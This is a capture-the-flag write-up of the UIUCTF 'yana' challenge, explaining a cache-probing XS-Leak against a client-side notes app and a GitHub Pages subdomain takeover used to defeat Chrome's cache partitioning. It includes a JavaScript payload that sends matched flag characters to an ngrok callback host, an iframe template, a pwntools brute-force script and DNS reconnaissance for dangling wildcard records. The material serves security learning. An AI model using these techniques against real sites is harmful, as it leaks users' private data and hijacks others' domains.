---
description: GitHub Pages subdomain takeover and cache probing XS-Leak
---

# yana

## Description

I made a note taking website. Can you get the admin's note?

https://chal.yana.wtf

admin bot `nc yana-bot.chal.uiuc.tf 1337`

**author**: arxenix

{% file src="../../.gitbook/assets/bot.js" %}
bot.js
{% endfile %}

## Preface

This challenge was really great, even though there was an unintended solution. It took me on quite the journey, learning about cache probing attacks and subdomain takeovers.

The unintended solution stems from how Chrome handles cache partitioning. While Chrome version 85 onwards supports cache partitioning, effectively isolating caches by the requesting origin, running Chrome in headless mode does not achieve the same effect.

While not required to solve the challenge, figuring out the intended solution - a GitHub Pages subdomain takeover - was definitely an awesome experience.

## Solution

This is a notepad app that functions entirely on the client-side. We can therefore analyze the JavaScript source code to look for vulnerabilities.

### Source Code Analysis

The app uses the browser's local storage to store the user's notes.

```javascript
const noteForm = document.getElementById("note");
noteForm.onsubmit = (e) => {
  e.preventDefault();
  window.localStorage.setItem("note", new FormData(noteForm).get("note"));
};
```

We can see this in action using Chrome DevTools.

![](<../../.gitbook/assets/Screenshot 2021-08-03 at 8.30.57 PM.png>)

There is also a search feature that "searches" for notes. Interestingly, the search query gets placed into the URL's [fragment identifier](https://en.wikipedia.org/wiki/URI\_fragment) through `document.location.hash`.

```javascript
const searchForm = document.getElementById("search");
const output = document.getElementById("output");
searchForm.onsubmit = (e) => {
  e.preventDefault();
  const query = new FormData(searchForm).get("search") ?? "";
  document.location.hash = query;
  search();
};
```

The search is implemented through the search function. The search function grabs the URL's fragment identifier, and checks if it is a substring of the note stored in the browser's local storage.

```javascript
function search() {
  const note = window.localStorage.getItem("note") ?? "";
  console.log(`note: ${note}`);
  const query = document.location.hash.substring(1);
  console.log(`query: ${query}`);
  if (query) {
    if (note.includes(query)) {
      console.log('found');
      output.innerHTML =
        'found! <br/><img src="https://sigpwny.com/uiuctf/y.png"></img>';
    } else {
      console.log('not found');
      output.innerHTML =
        'nope.. <br/><img src="https://sigpwny.com/uiuctf/n.png"></img>';
    }
  }
}
```

If the query is a valid substring, then the green `https://sigpwny.com/uiuctf/y.png` image is loaded and placed in the `output` div.

![](<../../.gitbook/assets/Screenshot 2021-08-03 at 8.44.57 PM.png>)

If the query is not found, the red `https://sigpwny.com/uiuctf/n.png` is loaded instead.

![](<../../.gitbook/assets/Screenshot 2021-08-03 at 8.48.29 PM.png>)

We are also provided with the `bot.js` script, which is the "admin" bot that visits any URL we give it. Notice that the flag is first saved as a note on the challenge server before our chosen URL is visited.

```javascript
async function load_url(socket, data) {
  let url = data.toString().trim();
  console.log(`checking url: ${url}`);
  if (!url.startsWith('http://') && !url.startsWith('https://')) {
    socket.state = 'ERROR';
    socket.write('Invalid scheme (http/https only).\n');
    socket.destroy();
    return;
  }
  socket.state = 'LOADED';

  // "incognito" by default
  const context = await browser.newContext();
  const page = await context.newPage();
  await page.goto("https://chal.yana.wtf");
  await page.fill('#note > textarea', FLAG);
  await page.click('#note > button');
  await page.waitForTimeout(500);
  await page.goto('about:blank');
  await page.waitForTimeout(500);
  socket.write(`Loading page ${url}.\n`);
  await page.goto(url);
  setTimeout(() => {
    try {
      page.close();
      socket.write('timeout\n');
      socket.destroy();
    } catch (err) {
      console.log(`err: ${err}`);
    }
  }, 60000);
}
```

### Cache Probing

Now, we know that:

* We are able to force the admin to visit the challenge server with any arbitrary fragment identifier, either directly (through submitting the challenge server URL to the bot) or indirectly (through JavaScript or iframes on our hosted site).
* This will allow us to make the admin's browser perform the search function, checking whether the provided fragment identifier is a substring of the flag.

At this point, I knew that it must have had something to do with brute-forcing the flag. However, since the search is performed on the client-side, we couldn't simply do a CSRF to get the search output.

Remember how `y.png` and `n.png` images are loaded based on the search output?

```javascript
if (note.includes(query)) {
  console.log('found');
  output.innerHTML =
    'found! <br/><img src="https://sigpwny.com/uiuctf/y.png"></img>';
} else {
  console.log('not found');
  output.innerHTML =
    'nope.. <br/><img src="https://sigpwny.com/uiuctf/n.png"></img>';
}
```

Perhaps we can perform a [cache probing](https://xsleaks.dev/docs/attacks/cache-probing/) attack to determine whether the search was successful. The principle is as follows:

1. The victim visits the attacker-controlled site. The attacker-controlled site loads an iframe of the notes site, with a search query. If the search query is a substring of the flag, then the `https://sigpwny.com/uiuctf/y.png` image is fetched and cached.
2. The attacker-controlled site fetches the `https://sigpwny.com/uiuctf/y.png` image.
3. By calculating the time taken to fetch the image, the attacker-controlled site can determine whether the image was cached (the time taken would be significantly lower).

This would allow us to brute-force the flag character by character.

### Setting Up The Attack

To implement the cache probing attack, we need to come up with a JavaScript payload that would be run on the victim's browser to determine whether the image was cached.

We define an `onFrameLoad()` function that will be called when the iframe of the notes site, containing the search query, is loaded.

```javascript
function onFrameLoad()
{
    setTimeout(() => {
        var xhr = new XMLHttpRequest();

        function exfil(cached, duration) {
        
            if (cached)
            {
                img = new Image();
                img.src = "http://964fb36503ae.ngrok.io/?cached=" + document.getElementById('iframe').src.split('#')[1];
            }
        }
        
        function check_cached(xhr, src) {
        
            var startTime = performance.now();
            
            xhr.open("GET", src);
            xhr.onreadystatechange = function () {
        
                if (xhr.readyState === 4) {
        
                    // check if image was cached based on response time
                    // if image was loaded in iframe, it would be cached
                    
                    var endTime = performance.now();
                    duration = endTime - startTime;
                    console.log(duration);
        
                    if (duration < 10)
                    {
                        exfil(true, duration);
                    }
                    else
                    {
                        exfil(false, duration);
                    }
                }
            };
        
            xhr.send();
        }
        
        check_cached(xhr, "https://sigpwny.com/uiuctf/y.png");
    }, 500);
}
```

We then prepare a `template.html` with a placeholder for the search query.

```markup
<script src="exploit.js"></script>
<iframe src="https://chal.yana.wtf/#{}" id="iframe" onload="onFrameLoad(this)"></iframe>
```

Then, an `exploit.py` script can automate the bruteforce attack.

```python
from pwn import *
import string

URL = 'http://964fb36503ae.ngrok.io/exploit.html'
FLAG = 'uiuctf{'

for char in string.ascii_lowercase + string.digits + '{}_':
    print(char)
    with open('template.html', 'r') as infile, open('exploit.html', 'w') as outfile:
        outfile.write(infile.read().format(FLAG + char))
    
    conn = remote('yana-bot.chal.uiuc.tf', 1337)
    conn.recv()
    conn.send(URL + '\r\n')
```

We will have to run this script for each new character, adding the previously found ones to the `FLAG` variable. (Perhaps I should have wrote a cleaner solution?)

![](<../../.gitbook/assets/image (23).png>)

### This Shouldn't Have Worked.

Here's why. I was hosting the exploit on an `ngrok` domain, but as of Chrome version 85, cache partitioning was implemented to defend against cache probing attacks. This [update](https://developers.google.com/web/updates/2020/10/http-cache-partitioning) by Google in October 2020 explains how the new cache partitioning system works.

In brief, a new "Network Isolation Key" was added, which contains both the top-level site and the current-frame site. This allows the iframe's cache to be seperate from the top-level site's cache. The following example illustrates our attack scenario.

![](<../../.gitbook/assets/Screenshot 2021-08-04 at 1.29.04 AM.png>)

The initial fetching of the image through the notes application iframe should have resulted in a cache key of (`attacker-site`, `notes-app-site`, `image-url`)

The second time the image is fetched through the attacker-controlled site, the cache key would _not_ contain the notes application site, and would instead be (`attacker-site`, `attacker-site`,`image-url`).

This should _not_ result in a cache hit, since the two cache keys are different. But it did. After some local testing, I found that **headless chrome simply doesn't perform cache partitioning**.

I ran the admin bot in headless mode (the default) as follows:

```javascript
const browser = await chromium.launch({
  executablePath: "PATH-TO-CHROMIUM",
  logger: {
    isEnabled: () => true,
    log: (name, severity, message, _args) => console.log(`chrome log: [${name}/${severity}] ${message}`)
  },
});
```

The attack worked. Cache partitioning was not enabled.

![](<../../.gitbook/assets/Screenshot 2021-08-04 at 1.48.45 AM.png>)

But running the bot with headless mode disabled, the attack did not work.

```javascript
const browser = await chromium.launch({
  executablePath: "PATH-TO-CHROMIUM",
  logger: {
    isEnabled: () => true,
    log: (name, severity, message, _args) => console.log(`chrome log: [${name}/${severity}] ${message}`)
  },
  headless: false,
});
```

This was the expected result, since cache partitioning should be enabled by default.

![](<../../.gitbook/assets/Screenshot 2021-08-04 at 1.50.55 AM.png>)

We can verify that both times, `y.png` was downloaded from the network, not fetched from the cache!

![](<../../.gitbook/assets/Screenshot 2021-08-04 at 1.54.17 AM.png>)

### The Intended Solution

Assuming that cache partitioning worked, how could we bypass it?

An important implementation detail is that subdomains and port numbers are actually ignored when creating the cache key.

![](<../../.gitbook/assets/Screenshot 2021-08-04 at 2.01.50 AM.png>)

So when the image is requested by `https://chal.yana.wtf/`, only `https://yana.wtf/` is actually saved in the cache key. This means that if we are able to control any `*.yana.wtf` subdomains, we would be able to bypass the cache partitioning since both requests would be originating from the same domain.

### Subdomain Takeover

From the `whois` records, we could tell that this was a [GitHub Pages](https://pages.github.com) site.

```
$ host chal.yana.wtf
chal.yana.wtf has address 185.199.108.153

$ whois 185.199.108.153

...

organisation:   ORG-GI58-RIPE
org-name:       GitHub, Inc.
country:        US
org-type:       LIR
address:        88 Colin P. Kelly Jr. Street
address:        94107
address:        San Francisco
address:        UNITED STATES
phone:          +1 415 735 4488
admin-c:        GA9828-RIPE
tech-c:         NO1444-RIPE
abuse-c:        AR39914-RIPE
mnt-ref:        us-github-1-mnt
mnt-by:         RIPE-NCC-HM-MNT
mnt-by:         us-github-1-mnt
created:        2017-04-11T08:28:46Z
last-modified:  2020-12-16T13:16:10Z
source:         RIPE # Filtered

...
```

I did not know this, but GitHub does not require you to prove that you actually own the domain before allowing you to setup a custom domain for your GitHub Pages site.

This opens up several possibilities for subdomain takeovers. As warned by the official documentation, a wildcard DNS record that points any subdomain to GitHub is especially dangerous.

![](<../../.gitbook/assets/Screenshot 2021-08-04 at 10.23.14 AM.png>)

A subdomain takeover can occur when there is a **dangling DNS entry**. Let me explain.

Using the `dig` command, we can find the DNS records configured for `chal.yana.wtf`.

```
$ dig chal.yana.wtf +nostats +nocomments +nocmd

; <<>> DiG 9.10.6 <<>> chal.yana.wtf +nostats +nocomments +nocmd
;; global options: +cmd
;chal.yana.wtf.			IN	A
chal.yana.wtf.		240	IN	A	185.199.108.153
```

An `A` record maps the domain to the GitHub pages server.

But if we poke around a little more, we find that the DNS configuration indeed seems to use a wildcard `A` record for `*.yana.wtf`. For instance, `a.yana.wtf` and `b.yana.wtf` do not have any GitHub page associated with them, yet point to the GitHub pages server.

```
$ dig a.yana.wtf +nostats +nocomments +nocmd

; <<>> DiG 9.10.6 <<>> a.yana.wtf +nostats +nocomments +nocmd
;; global options: +cmd
;a.yana.wtf.			IN	A
a.yana.wtf.		300	IN	A	185.199.108.153

$ dig b.yana.wtf +nostats +nocomments +nocmd

; <<>> DiG 9.10.6 <<>> b.yana.wtf +nostats +nocomments +nocmd
;; global options: +cmd
;b.yana.wtf.			IN	A
b.yana.wtf.		300	IN	A	185.199.108.153
```

Going to `http://a.yana.wtf`, therefore, will still forward the request to GitHub. GitHub looks for GitHub repositories with the appropriate `CNAME` file. Since no repository is configured to serve `a.yana.wtf`, a 404 page is shown.

![](<../../.gitbook/assets/Screenshot 2021-08-04 at 10.53.10 AM.png>)

This is a dangling DNS record, since anyone with a GitHub account can add the `CNAME` file containing `a.yana.wtf` to their repository, thereby taking over the `a.yana.wtf` domain.

With the exploit scripts we created earlier, we can create our own GitHub Pages site.

![](<../../.gitbook/assets/Screenshot 2021-08-04 at 10.26.01 AM.png>)

We configure the custom domain to `abc.yana.wtf`, which creates the following `CNAME` file in our repository.

![](<../../.gitbook/assets/Screenshot 2021-08-04 at 10.56.13 AM.png>)

Now, if we go to `http://abc.yana.wtf`, we will find that our exploit is being served!

![](<../../.gitbook/assets/Screenshot 2021-08-04 at 11.08.58 AM.png>)

Now, things are a little different. Because both the iframe and the top-level site are in the same `yana.wtf` domain, Chrome does not partition the cache. Notice that the first request, initiated by the iframe, fetched `y.png` from the network, while the second request, initiated by our exploit script, fetched `y.png` from the browser's cache.

![](<../../.gitbook/assets/Screenshot 2021-08-04 at 11.20.41 AM.png>)

This obviously causes a significant difference in the time taken to fetch the resources, allowing us to carry out the cache probing attack even when Chrome's cache partitioning policy is in effect.

As a sanity check, I ran the bot again locally without headless mode, this time providing it the `https://abc.yana.wtf/exploit.html` URL.

![](<../../.gitbook/assets/Screenshot 2021-08-04 at 11.48.20 AM.png>)

I confirmed that the exploit worked. Our exploit script determined that `y.png` was cached, and made a callback to our `ngrok` server with the successful query.
